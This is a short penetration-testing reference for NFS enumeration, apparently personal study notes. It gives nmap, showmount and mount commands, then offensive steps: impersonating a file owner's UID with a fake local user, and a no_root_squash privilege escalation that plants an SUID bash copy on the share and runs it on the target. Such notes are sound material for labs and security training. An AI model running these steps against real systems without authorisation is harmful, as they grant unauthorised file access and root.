
# NFS Tools Reference

Quick command reference for NFS enumeration. For theory, workflow, and what to look for, see [[01-Recon/NFS-Enumeration|NFS Enumeration]].

Ports: `2049` (TCP/UDP), `111` (TCP/UDP rpcbind)

---

## Nmap

```bash
# Service scan on NFS ports
sudo nmap -sV -sC -p111,2049 <target>

# All NFS NSE scripts (ls, showmount, statfs, rpcinfo)
sudo nmap --script nfs* -sV -p111,2049 <target>
```

Key scripts:

| Script | What It Does |
|--------|-------------|
| `nfs-ls` | Lists share contents and permissions without mounting |
| `nfs-showmount` | Shows available exports and allowed client ranges |
| `nfs-statfs` | Returns filesystem stats (size, used, available) |
| `rpcinfo` | Lists all running RPC services with ports and versions |

---

## showmount

```bash
# List available exports
showmount -e <target>
```

---

## Mount / Unmount

```bash
# Create mount point and mount
mkdir target-NFS
sudo mount -t nfs <target>:/ ./target-NFS/ -o nolock

# Inspect contents
ls -l ./target-NFS/mnt/nfs/   # names
ls -n ./target-NFS/mnt/nfs/   # raw UIDs/GIDs

# Tree view
tree ./target-NFS

# Unmount
cd ..
sudo umount ./target-NFS
```

---

## UID Impersonation

```bash
# Create local user matching remote file owner UID
sudo useradd -u <uid> fakeuser
sudo su fakeuser

# Now access files on the mounted share as that UID
```

---

## no_root_squash SUID Privesc

```bash
# On attack machine (as root), with share mounted
cp /bin/bash ./target-NFS/mnt/nfs/shell
chmod +s ./target-NFS/mnt/nfs/shell

# On target (via SSH)
/mnt/nfs/shell -p    # -p preserves EUID
```

Only works when `no_root_squash` is set on the export.
